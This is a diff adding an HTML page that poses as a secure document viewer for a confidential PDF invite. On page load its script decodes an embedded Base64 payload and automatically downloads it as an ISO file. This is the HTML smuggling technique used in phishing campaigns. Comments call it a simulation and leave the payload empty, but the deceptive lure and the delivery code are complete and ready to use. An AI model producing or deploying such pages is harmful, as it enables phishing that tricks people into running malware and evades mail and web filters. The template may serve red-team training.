@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer - Secure Portal</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding-top: 100px; }
+        .box { background: white; padding: 40px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" width="50" alt="PDF">
+        <h2>Confidential_Invite_2025.pdf</h2>
+        <div class="spinner"></div>
+        <p id="status">Decrypting document for secure viewing...</p>
+    </div>
+
+    <script>
+        // 1. This is your "Smuggled" Payload. 
+        // For your simulation, this string would be your ISO file converted to Base64.
+        var base64Data = ``;
+
+        function downloadFile() {
+            var fileName = "Confidential_Invite.iso";
+            
+            // 2. Convert Base64 to a Binary Array
+            var byteCharacters = atob(base64Data);
+            var byteNumbers = new Array(byteCharacters.length);
+            for (var i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            var byteArray = new Uint8Array(byteNumbers);
+            
+            // 3. Create the "Blob" and trigger download
+            var blob = new Blob([byteArray], {type: "application/octet-stream"});
+            var link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = fileName;
+            
+            document.getElementById("status").innerText = "Download Starting...";
+            setTimeout(function() {
+                link.click(); // This "clicks" the hidden download link automatically
+            }, 2000);
+        }
+
+        // Trigger the process when the page loads
+        window.onload = downloadFile;
+    </script>
+</body>
+</html>
